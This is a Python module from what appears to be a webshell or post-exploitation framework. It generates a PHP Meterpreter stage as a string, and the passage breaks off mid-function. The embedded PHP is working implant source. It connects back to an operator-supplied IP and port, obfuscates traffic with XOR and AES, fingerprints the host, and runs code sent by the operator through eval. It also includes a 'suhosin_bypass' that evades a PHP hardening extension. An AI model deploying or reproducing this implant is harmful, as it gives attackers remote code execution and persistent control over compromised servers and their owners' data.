from threading import Thread
from time import sleep

from libs.config import alias, color, gget
from libs.myapp import is_windows, send
from random import randint

def get_php_meterpreter(ip: str,port: int):
    UUID = '"' + "\\x2a\\xc8\\xa4\\xae\\x79\\xe4\\x61\\x52\\x17\\x6a\\x04\\x65\\x48\\xd8\\x52\\x8a" + '"'
    return """
if (!isset($GLOBALS['channels'])) { 
	$GLOBALS['channels'] = array(); 
} 
if (!isset($GLOBALS['channel_process_map'])) { 
	$GLOBALS['channel_process_map'] = array(); 
} 
if (!isset($GLOBALS['resource_type_map'])) { 
	$GLOBALS['resource_type_map'] = array(); 
} 
if (!isset($GLOBALS['udp_host_map'])) { 
	$GLOBALS['udp_host_map'] = array(); 
} 
if (!isset($GLOBALS['readers'])) { 
	$GLOBALS['readers'] = array(); 
} 
if (!isset($GLOBALS['commands'])) { 
	$GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_set_uuid", "core_set_session_guid", "core_get_session_guid", "core_negotiate_tlv_encryption"); 
} 
	
	function register_command($c) { 
		global $commands; 
		if (! in_array($c, $commands)) { 
			array_push($commands, $c); } 
	} 
	
	function my_print($str) { 
	
	} 
	my_print("Evaling main meterpreter stage"); 
	
	function dump_array($arr, $name=null) { 
		if (is_null($name)) { 
			$name = "Array"; 
		} 
		my_print(sprintf("$name (%s)", count($arr))); 
		foreach ($arr as $key => $val) { 
			if (is_array($val)) { 
				dump_array($val, "{$name}[{$key}]"); 
			} 
			else { 
				my_print(sprintf(" $key ($val)")); 
			} 
		} 
	} 
	
	function dump_readers() { 
		global $readers; 
		dump_array($readers, 'Readers'); 
	} 
	
	function dump_resource_map() { 
		global $resource_type_map; 
		dump_array($resource_type_map, 'Resource map'); 
	} 
	
	function dump_channels($extra="") { 
		global $channels; 
		dump_array($channels, 'Channels '.$extra); 
	} 
	
if (!function_exists("file_get_contents")) { 
	function file_get_contents($file) { 
		$f = @fopen($file,"rb");
		$contents = false;
		if ($f) { 
			do { 
				$contents .= fgets($f); 
			} while (!feof($f)); 
		} 
		fclose($f); 
		return $contents; 
	} 
} 

if (!function_exists('socket_set_option')) { 
	function socket_set_option($sock, $type, $opt, $value) { 
		socket_setopt($sock, $type, $opt, $value); 
	} 
} 

define("PAYLOAD_UUID", """ + UUID + """); 
define("SESSION_GUID", "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"); 
define("AES_256_CBC", 'aes-256-cbc'); 
define("ENC_NONE", 0); 
define("ENC_AES256", 1); 
define("PACKET_TYPE_REQUEST", 0); 
define("PACKET_TYPE_RESPONSE", 1); 
define("PACKET_TYPE_PLAIN_REQUEST", 10); 
define("PACKET_TYPE_PLAIN_RESPONSE", 11); 
define("ERROR_SUCCESS", 0); 
define("ERROR_FAILURE", 1); 
define("CHANNEL_CLASS_BUFFERED", 0); 
define("CHANNEL_CLASS_STREAM", 1); 
define("CHANNEL_CLASS_DATAGRAM", 2); 
define("CHANNEL_CLASS_POOL", 3); 
define("TLV_META_TYPE_NONE", ( 0 )); 
define("TLV_META_TYPE_STRING", (1 << 16)); 
define("TLV_META_TYPE_UINT", (1 << 17)); 
define("TLV_META_TYPE_RAW", (1 << 18)); 
define("TLV_META_TYPE_BOOL", (1 << 19)); 
define("TLV_META_TYPE_QWORD", (1 << 20)); 
define("TLV_META_TYPE_COMPRESSED", (1 << 29)); 
define("TLV_META_TYPE_GROUP", (1 << 30)); 
define("TLV_META_TYPE_COMPLEX", (1 << 31)); 
define("TLV_META_TYPE_MASK", (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)); 
define("TLV_RESERVED", 0); 
define("TLV_EXTENSIONS", 20000); 
define("TLV_USER", 40000); 
define("TLV_TEMP", 60000); 
define("TLV_TYPE_ANY", TLV_META_TYPE_NONE | 0); 
define("TLV_TYPE_METHOD", TLV_META_TYPE_STRING | 1); 
define("TLV_TYPE_REQUEST_ID", TLV_META_TYPE_STRING | 2); 
define("TLV_TYPE_EXCEPTION", TLV_META_TYPE_GROUP | 3); 
define("TLV_TYPE_RESULT", TLV_META_TYPE_UINT | 4); 
define("TLV_TYPE_STRING", TLV_META_TYPE_STRING | 10); 
define("TLV_TYPE_UINT", TLV_META_TYPE_UINT | 11); 
define("TLV_TYPE_BOOL", TLV_META_TYPE_BOOL | 12); 
define("TLV_TYPE_LENGTH", TLV_META_TYPE_UINT | 25); 
define("TLV_TYPE_DATA", TLV_META_TYPE_RAW | 26); 
define("TLV_TYPE_FLAGS", TLV_META_TYPE_UINT | 27); 
define("TLV_TYPE_CHANNEL_ID", TLV_META_TYPE_UINT | 50); 
define("TLV_TYPE_CHANNEL_TYPE", TLV_META_TYPE_STRING | 51); 
define("TLV_TYPE_CHANNEL_DATA", TLV_META_TYPE_RAW | 52); 
define("TLV_TYPE_CHANNEL_DATA_GROUP", TLV_META_TYPE_GROUP | 53); 
define("TLV_TYPE_CHANNEL_CLASS", TLV_META_TYPE_UINT | 54); 
define("TLV_TYPE_SEEK_WHENCE", TLV_META_TYPE_UINT | 70); 
define("TLV_TYPE_SEEK_OFFSET", TLV_META_TYPE_UINT | 71); 
define("TLV_TYPE_SEEK_POS", TLV_META_TYPE_UINT | 72); 
define("TLV_TYPE_EXCEPTION_CODE", TLV_META_TYPE_UINT | 300); 
define("TLV_TYPE_EXCEPTION_STRING", TLV_META_TYPE_STRING | 301); 
define("TLV_TYPE_LIBRARY_PATH", TLV_META_TYPE_STRING | 400); 
define("TLV_TYPE_TARGET_PATH", TLV_META_TYPE_STRING | 401); 
define("TLV_TYPE_MACHINE_ID", TLV_META_TYPE_STRING | 460); 
define("TLV_TYPE_UUID", TLV_META_TYPE_RAW | 461); 
define("TLV_TYPE_SESSION_GUID", TLV_META_TYPE_RAW | 462); 
define("TLV_TYPE_RSA_PUB_KEY", TLV_META_TYPE_STRING | 550); 
define("TLV_TYPE_SYM_KEY_TYPE", TLV_META_TYPE_UINT | 551); 
define("TLV_TYPE_SYM_KEY", TLV_META_TYPE_RAW | 552); 
define("TLV_TYPE_ENC_SYM_KEY", TLV_META_TYPE_RAW | 553); 

function my_cmd($cmd) { 
	return shell_exec($cmd); 
} 

function is_windows() { 
	return (strtoupper(substr(PHP_OS,0,3)) == "WIN"); 
} 

function core_channel_open($req, &$pkt) { 
	$type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE); 
	my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do"); 
	$handler = "channel_create_". $type_tlv['value']; 
	if ($type_tlv['value'] && is_callable($handler)) { 
		my_print("Calling {$handler}"); 
			$ret = $handler($req, $pkt); 
	} else { 
		my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =("); $ret = ERROR_FAILURE; 
	} 
	return $ret; 
} 

function core_channel_eof($req, &$pkt) { 
	my_print("doing channel eof"); 
	$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); 
	$c = get_channel_by_id($chan_tlv['value']); 
	if ($c) { 
		if (eof($c[1])) { 
			packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1)); 
		} else { 
			packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0)); 
		} 
		return ERROR_SUCCESS; 
	} else { 
		return ERROR_FAILURE; 
	} 
} 

function core_channel_read($req, &$pkt) { 
	my_print("doing channel read"); 
	$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); 
	$len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH); 
	$id = $chan_tlv['value']; $len = $len_tlv['value']; 
	$data = channel_read($id, $len); 
	if ($data === false) { 
		$res = ERROR_FAILURE; 
	} else { 
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data)); 
		$res = ERROR_SUCCESS; 
	} 
	return $res; 
} 

function core_channel_write($req, &$pkt) { 
	$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); 
	$data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA); 
	$len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH); 
	$id = $chan_tlv['value']; 
	$data = $data_tlv['value']; 
	$len = $len_tlv['value']; 
	$wrote = channel_write($id, $data, $len); 
	if ($wrote === false) { 
		return ERROR_FAILURE; 
	} else { 
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote)); 
		return ERROR_SUCCESS; 
	} 
} 

function core_channel_close($req, &$pkt) { 
	global $channel_process_map; 
	my_print("doing channel close"); 
	$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); 
	$id = $chan_tlv['value']; 
	$c = get_channel_by_id($id); 
	if ($c) { 
		channel_close_handles($id); 
		channel_remove($id); 
		if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) { 
			close_process($channel_process_map[$id]); 
		} 
		return ERROR_SUCCESS; 
	} 
	dump_channels("after close"); 
	return ERROR_FAILURE; 
} 

function channel_close_handles($cid) { 
	global $channels; 
	if (!array_key_exists($cid, $channels)) { 
		return; 
	} 
	$c = $channels[$cid]; 
	for($i = 0; $i < 3; $i++) { 
		if (array_key_exists($i, $c) && is_resource($c[$i])) { 
			close($c[$i]); remove_reader($c[$i]); 
		} 
	} 
	if (strlen($c['data']) == 0) { 
		channel_remove($cid); 
	} 
} 

function channel_remove($cid) { 
	global $channels; 
	unset($channels[$cid]); 
} 

function core_channel_interact($req, &$pkt) { 
	global $readers; 
	my_print("doing channel interact"); 
	$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); 
	$id = $chan_tlv['value']; 
	$toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL); 
	$c = get_channel_by_id($id); 
	if ($c) { 
		if ($toggle_tlv['value']) { 
			if (!in_array($c[1], $readers)) { 
				add_reader($c[1]); 
				if (array_key_exists(2, $c) && $c[1] != $c[2]) { 
					add_reader($c[2]); 
				} $ret = ERROR_SUCCESS; 
			} else { 
				$ret = ERROR_FAILURE; 
			} 
		} else { 
			if (in_array($c[1], $readers)) { 
				remove_reader($c[1]); 
				remove_reader($c[2]); 
				$ret = ERROR_SUCCESS; 
			} else { 
				$ret = ERROR_SUCCESS; 
			} 
		} 
	} else { 
		my_print("Trying to interact with an invalid channel"); 
		$ret = ERROR_FAILURE; } 
		return $ret; 
} 

function interacting($cid) { 
	global $readers; 
	$c = get_channel_by_id($cid); 
	if (in_array($c[1], $readers)) { 
		return true; 
	} 
	return false; 
} 

function core_shutdown($req, &$pkt) { 
	my_print("doing core shutdown");
	die(); 
} 

function core_loadlib($req, &$pkt) { 
	global $commands; 
	my_print("doing core_loadlib"); 
	$data_tlv = packet_get_tlv($req, TLV_TYPE_DATA); 
	if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) { 
		return ERROR_FAILURE; 
	} 
	$tmp = $commands; 
	if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { 
		$suhosin_bypass=create_function('', $data_tlv['value']); 
		$suhosin_bypass(); 
	} else { 
		eval($data_tlv['value']); 
	} 
	$new = array_diff($commands, $tmp); 
	foreach ($new as $meth) { 
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth));
	} 
	return ERROR_SUCCESS;
} 

function core_enumextcmd($req, &$pkt) { 
	my_print("doing core_enumextcmd"); 
	global $commands; 
	$extension_name_tlv = packet_get_tlv($req, TLV_TYPE_STRING);
	; 
	$expected_ext_name = $extension_name_tlv['value']; 
	foreach ($commands as $ext_cmd) { 
		list($ext_name, $cmd) = explode("_", $ext_cmd, 2); 
		if ($ext_name == $expected_ext_name) { 
			packet_add_tlv($pkt, create_tlv(TLV_TYPE_STRING, $cmd)); 
		} 
	} 
	return ERROR_SUCCESS; 
} 

function core_set_uuid($req, &$pkt) { 
	my_print("doing core_set_uuid"); 
	$new_uuid = packet_get_tlv($req, TLV_TYPE_UUID); 
	if ($new_uuid != null) { 
		$GLOBALS['UUID'] = $new_uuid['value']; 
		my_print("New UUID is {$GLOBALS['UUID']}"); 
	} 
	return ERROR_SUCCESS; 
} 

function get_hdd_label() { 
	foreach (scandir('/dev/disk/by-id/') as $file) {
		foreach (array("ata-", "mb-") as $prefix) {
			if (strpos($file, $prefix) === 0) {
				return substr($file, strlen($prefix));
			}
		}
	} 
	return ""; 
} 

function core_negotiate_tlv_encryption($req, &$pkt) {
	if (supports_aes()) {
		my_print("AES functionality is supported");
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256));
		$GLOBALS['AES_ENABLED'] = false;
		$GLOBALS['AES_KEY'] = rand_bytes(32);
		if (function_exists('openssl_pkey_get_public') && function_exists('openssl_public_encrypt')) {
			my_print("Encryption via public key is supported");
			$pub_key_tlv = packet_get_tlv($req, TLV_TYPE_RSA_PUB_KEY);
			if ($pub_key_tlv != null) {
				$key = openssl_pkey_get_public($pub_key_tlv['value']);
				$enc = '';
				openssl_public_encrypt($GLOBALS['AES_KEY'], $enc, $key, OPENSSL_PKCS1_PADDING);
				packet_add_tlv($pkt, create_tlv(TLV_TYPE_ENC_SYM_KEY, $enc));
				return ERROR_SUCCESS; 
			} 
		} 
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY, $GLOBALS['AES_KEY'])); 
	} 
	return ERROR_SUCCESS; 
} 

function core_get_session_guid($req, &$pkt) {
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_GUID, $GLOBALS['SESSION_GUID']));
	return ERROR_SUCCESS;
}

function core_set_session_guid($req, &$pkt) {
	my_print("doing core_set_session_guid");
	$new_guid = packet_get_tlv($req, TLV_TYPE_SESSION_GUID);
	if ($new_guid != null) {
		$GLOBALS['SESSION_ID'] = $new_guid['value'];
		my_print("New Session GUID is {$GLOBALS['SESSION_GUID']}");
	} 
	return ERROR_SUCCESS; 
} 

function core_machine_id($req, &$pkt) {
	my_print("doing core_machine_id");
	if (is_callable('gethostname')) {
		$machine_id = gethostname(); 
	} else {
		$machine_id = php_uname('n');	
	} 
	$serial = "";
	if (is_windows()) {
		$output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
		$serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
	} else {
		$serial = get_hdd_label(); 
	}
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id));
	return ERROR_SUCCESS; 
} 

$channels = array(); 

function register_channel($in, $out=null, $err=null) {
	global $channels;
	if ($out == null) {
		$out = $in; 
	} 
	if ($err == null) {
		$err = $out; 
	}
	$channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '');
	$id = end(array_keys($channels)); my_print("Created new channel $in, with id $id"); return $id;
} 

function get_channel_id_from_resource($resource) {
	global $channels;
	if (empty($channels)) {
		return false; 
	}
	foreach ($channels as $i => $chan_ary) {
		if (in_array($resource, $chan_ary)) {
			my_print("Found channel id $i");
			return $i; 
		} 
	} 
	return false; 
} 

function &get_channel_by_id($chan_id) {
	global $channels;
	my_print("Looking up channel id $chan_id");
	if (array_key_exists($chan_id, $channels)) {
		my_print("Found one");
		return $channels[$chan_id];
	} else {
		return false; 
	} 
} 

function channel_write($chan_id, $data) {
	$c = get_channel_by_id($chan_id);
	if ($c && is_resource($c[0])) {
		my_print("---Writing '$data' to channel $chan_id");
		return write($c[0], $data);
	} else {
		return false; 
	} 
} 

function channel_read($chan_id, $len) {
	$c = &get_channel_by_id($chan_id);
	if ($c) {
		$ret = substr($c['data'], 0, $len);
		$c['data'] = substr($c['data'], $len);
		if (strlen($ret) > 0) {
			my_print("Had some leftovers: '$ret'"); 
		} 
		if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) {
			$read = read($c[2]); 
			$c['data'] .= $read; 
			$bytes_needed = $len - strlen($ret); 
			$ret .= substr($c['data'], 0, $bytes_needed); 
			$c['data'] = substr($c['data'], $bytes_needed); 
		} 
		if (strlen($ret) < $len and is_resource($c[1])) {
			$read = read($c[1]);
			$c['data'] .= $read;
			$bytes_needed = $len - strlen($ret);
			$ret .= substr($c['data'], 0, $bytes_needed);
			$c['data'] = substr($c['data'], $bytes_needed);
		} 
		if (false === $read and empty($ret)) {
			if (interacting($chan_id)) {
				handle_dead_resource_channel($c[1]);
			} 
			return false; 
		} 
		return $ret; 
	} else { 
		return false; 
	} 
} 

function rand_xor_byte() {
	return chr(mt_rand(1, 255)); 
} 

function rand_bytes($size) {
	$b = ''; 
	for ($i = 0; $i < $size; $i++) {
		$b .= rand_xor_byte(); 
	} 
	return $b; 
} 

function rand_xor_key() { 
	return rand_bytes(4); 
} 

function xor_bytes($key, $data) {
	$result = '';
	for ($i = 0; $i < strlen($data); ++$i) {
		$result .= $data{$i} ^ $key{$i % 4};
	} 
	return $result; 
} 

function generate_req_id() {
	$characters = 'abcdefghijklmnopqrstuvwxyz';
	$rid = '';
	for ($p = 0; $p < 32; $p++) {
		$rid .= $characters[rand(0, strlen($characters)-1)]; 
	} 
	return $rid; 
} 

function supports_aes() {
	return function_exists('openssl_decrypt') && function_exists('openssl_encrypt'); 
} 

function decrypt_packet($raw) {
	$len_array = unpack("Nlen", substr($raw, 20, 4));
	$encrypt_flags = $len_array['len'];
	if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) {
		$tlv = substr($raw, 24);
		$dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16)); 
		return pack("N", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec; 
	} 
	return substr($raw, 24); 
} 

function encrypt_packet($raw) {
	if (supports_aes() && $GLOBALS['AES_KEY'] != null) {
		if ($GLOBALS['AES_ENABLED'] === true) {
			$iv = rand_bytes(16); 
			$enc = $iv . openssl_encrypt(substr($raw, 8), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, $iv);
			$hdr = pack("N", strlen($enc) + 8) . substr($raw, 4, 4); 
			return $GLOBALS['SESSION_GUID'] . pack("N", ENC_AES256) . $hdr . $enc; 
		} 
		$GLOBALS['AES_ENABLED'] = true; 
	} 
	return $GLOBALS['SESSION_GUID'] . pack("N", ENC_NONE) . $raw; 
} 

function write_tlv_to_socket($resource, $raw) {
	$xor = rand_xor_key();
	write($resource, $xor . xor_bytes($xor, encrypt_packet($raw))); 
} 

function handle_dead_resource_channel($resource) {
	global $msgsock; if (!is_resource($resource)) {
		return; 
	} 
	$cid = get_channel_id_from_resource($resource);
	if ($cid === false) {
		my_print("Resource has no channel: {$resource}");
		remove_reader($resource);
		close($resource);
	} else {
		my_print("Handling dead resource: {$resource}, for channel: {$cid}");
		channel_close_handles($cid);
		$pkt = pack("N", PACKET_TYPE_REQUEST);
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
		$pkt = pack("N", strlen($pkt) + 4) . $pkt; write_tlv_to_socket($msgsock, $pkt);
	} 
} 

function handle_resource_read_channel($resource, $data) {
	global $udp_host_map;
	$cid = get_channel_id_from_resource($resource);
	my_print("Handling data from $resource");
	$pkt = pack("N", PACKET_TYPE_REQUEST);
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
	if (array_key_exists((int)$resource, $udp_host_map)) {
		list($h,$p) = $udp_host_map[(int)$resource];
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h));
		packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p));
	} 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid)); 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data)); 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data))); 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id())); 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID'])); 
	$pkt = pack("N", strlen($pkt) + 4) . $pkt; return $pkt; 
} 

function create_response($req) { 
	$pkt = pack("N", PACKET_TYPE_RESPONSE); 
	$method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
	my_print("method is {$method_tlv['value']}");
	packet_add_tlv($pkt, $method_tlv);
	$reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
	packet_add_tlv($pkt, $reqid_tlv);
	if (is_callable($method_tlv['value'])) {
		$result = $method_tlv['value']($req, $pkt);
	} else {
		my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure"); $result = ERROR_FAILURE;
	} 
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
	packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
	$pkt = pack("N", strlen($pkt) + 4) . $pkt; return $pkt; 
}

function create_tlv($type, $val) {
	return array( 'type' => $type, 'value' => $val ); 
} 

function tlv_pack($tlv) {
	$ret = "";
	if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
		$ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
	} elseif (($tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
		$hi = ($tlv['value'] >> 32) & 0xFFFFFFFF;
		$lo = $tlv['value'] & 0xFFFFFFFF;
		$ret = pack("NNNN", 8 + 8, $tlv['type'], $hi, $lo);
	} elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
		$ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
	} elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
		$ret = pack("NN", 8 + 1, $tlv['type']); $ret .= $tlv['value'] ? "\\x01" : "\\x00"; 
	} elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
		$ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; 
	} elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
		$ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; 
	} elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) { 
		$ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; 
	} else { 
		my_print("Don't know how to make a tlv of type ". $tlv['type'] . " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf"); 
	} 
	return $ret; 
} 

function tlv_unpack($raw_tlv) {
	$tlv = unpack("Nlen/Ntype", substr($raw_tlv, 0, 8));
	$type = $tlv['type'];
	my_print("len: {$tlv['len']}, type: {$tlv['type']}");
	if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
		$tlv = unpack("Nlen/Ntype/a*value", substr($raw_tlv, 0, $tlv['len']));
		$tlv['value'] = str_replace("\0", "", $tlv['value']);
	} elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
		$tlv = unpack("Nlen/Ntype/Nvalue", substr($raw_tlv, 0, $tlv['len']));
	} elseif (($type & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
		$tlv = unpack("Nlen/Ntype/Nhi/Nlo", substr($raw_tlv, 0, $tlv['len']));
		$tlv['value'] = $tlv['hi'] << 32 | $tlv['lo'];
	} elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
		$tlv = unpack("Nlen/Ntype/cvalue", substr($raw_tlv, 0, $tlv['len'])); 
	} elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) { 
		$tlv = unpack("Nlen/Ntype", $raw_tlv); 
		$tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8); 
	} else { 
		my_print("Wtf type is this? $type");
		$tlv = null; } return $tlv; 
} 

function packet_add_tlv(&$pkt, $tlv) { 
	$pkt .= tlv_pack($tlv); 
} 

function packet_get_tlv($pkt, $type) {
	$offset = 8; 
	while ($offset < strlen($pkt)) {
		$tlv = tlv_unpack(substr($pkt, $offset)); 
		if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
			return $tlv; 
		} 
		$offset += $tlv['len']; 
	} 
return null; 
} 

function packet_get_all_tlvs($pkt, $type) { 
	my_print("Looking for all tlvs of type $type"); 
	$offset = 8; 
	$all = array(); 
	while ($offset < strlen($pkt)) { 
		$tlv = tlv_unpack(substr($pkt, $offset)); 
		if ($tlv == NULL) { 
			break; 
		} 
		my_print("len: {$tlv['len']}, type: {$tlv['type']}");
		if (empty($type) || $type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
			my_print("Found one at offset $offset");
			array_push($all, $tlv); 
		} 
		$offset += $tlv['len'];
	} 
return $all; 
} 

function register_socket($sock, $ipaddr=null, $port=null) { 
	global $resource_type_map, $udp_host_map; 
	my_print("Registering socket $sock for ($ipaddr:$port)");
	$resource_type_map[(int)$sock] = 'socket';
	if ($ipaddr) {
		$udp_host_map[(int)$sock] = array($ipaddr, $port);
	} 
} 

function register_stream($stream, $ipaddr=null, $port=null) {
	global $resource_type_map, $udp_host_map;
	my_print("Registering stream $stream for ($ipaddr:$port)");
	$resource_type_map[(int)$stream] = 'stream';
	if ($ipaddr) {
		$udp_host_map[(int)$stream] = array($ipaddr, $port); 
	} 
} 

function connect($ipaddr, $port, $proto='tcp') {
	my_print("Doing connect($ipaddr, $port)");
	$sock = false;
	$ipf = AF_INET;
	$raw_ip = $ipaddr;
	if (FALSE !== strpos($ipaddr, ":")) {
		$ipf = AF_INET6;
		$ipaddr = "[". $raw_ip ."]"; 
	} 
	if (is_callable('stream_socket_client')) {
		my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})");
		if ($proto == 'ssl') {
			$sock = stream_socket_client("ssl://{$ipaddr}:{$port}", $errno, $errstr, 5, STREAM_CLIENT_ASYNC_CONNECT);
			if (!$sock) { 
				return false; 
			} 
			stream_set_blocking($sock, 0);
			register_stream($sock); 
		} elseif ($proto == 'tcp') {
			$sock = stream_socket_client("tcp://{$ipaddr}:{$port}");
			if (!$sock) {
				return false; 
			}
			register_stream($sock);
		} elseif ($proto == 'udp') {
			$sock = stream_socket_client("udp://{$ipaddr}:{$port}");
			if (!$sock) {
				return false; 
			}
			register_stream($sock, $ipaddr, $port); 
		} 
	} else if (is_callable('fsockopen')) { 
		my_print("fsockopen");
		if ($proto == 'ssl') {
			$sock = fsockopen("ssl://{$ipaddr}:{$port}");
			stream_set_blocking($sock, 0); register_stream($sock);
		} elseif ($proto == 'tcp') {
			$sock = fsockopen($ipaddr, $port);
			if (!$sock) {
				return false;
			} 
			if (is_callable('socket_set_timeout')) {
				socket_set_timeout($sock, 2); 
			}
			register_stream($sock); 
		} else {
			$sock = fsockopen($proto."://".$ipaddr,$port);
			if (!$sock) {
				return false; 
			}
			register_stream($sock, $ipaddr, $port); 
		} 
	} else if (is_callable('socket_create')) { 
		my_print("socket_create"); 
		if ($proto == 'tcp') {
			$sock = socket_create($ipf, SOCK_STREAM, SOL_TCP);
			$res = socket_connect($sock, $raw_ip, $port);
			if (!$res) {
				return false; 
			} 
			register_socket($sock); 
		} elseif ($proto == 'udp') {
			$sock = socket_create($ipf, SOCK_DGRAM, SOL_UDP);
			register_socket($sock, $raw_ip, $port);
		} 
	} 
	return $sock; 
} 


function eof($resource) {
	$ret = false;
	switch (get_rtype($resource)) {
		case 'socket': break;
		case 'stream': $ret = feof($resource);break;
	}
	return $ret; 
} 

function close($resource) {
	my_print("Closing resource $resource");
	global $resource_type_map, $udp_host_map;
	remove_reader($resource);
	switch (get_rtype($resource)) {
		case 'socket': $ret = socket_close($resource);break;
		case 'stream': $ret = fclose($resource); break;
	} 
	if (array_key_exists((int)$resource, $resource_type_map)) {
		unset($resource_type_map[(int)$resource]);
	} if (array_key_exists((int)$resource, $udp_host_map)) {
		my_print("Removing $resource from udp_host_map");
		unset($udp_host_map[(int)$resource]);
	} 
	return $ret; 
} 

function read($resource, $len=null) {
	global $udp_host_map;
	if (is_null($len)) {
		$len = 8192; 
	} 
	$buff = '';
	switch (get_rtype($resource)) {
		case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) {
				my_print("Reading UDP socket");
				list($host,$port) = $udp_host_map[(int)$resource];
				socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port); 
			} else {
				my_print("Reading TCP socket");
				$buff .= socket_read($resource, $len, PHP_BINARY_READ);
			} break; 
		case 'stream': 
			global $msgsock; 
			$r = Array($resource);
			my_print("Calling select to see if there's data on $resource");
			$last_requested_len = 0;
			while (true) {
				$w=NULL;
				$e=NULL;
				$t=0;
				$cnt = stream_select($r, $w, $e, $t);
				if ($cnt === 0) { 
					break; 
				} 
				if ($cnt === false or feof($resource)) {
					my_print("Checking for failed read...");
					if (empty($buff)) {
						my_print("---- EOF ON $resource ----");
						$buff = false;
					} 
					break; 
				} 
				$md = stream_get_meta_data($resource);
				dump_array($md, "Metadata for {$resource}");
				if ($md['unread_bytes'] > 0) {
					$last_requested_len = min($len, $md['unread_bytes']);
					$buff .= fread($resource, $last_requested_len);
					break; 
				} else { 
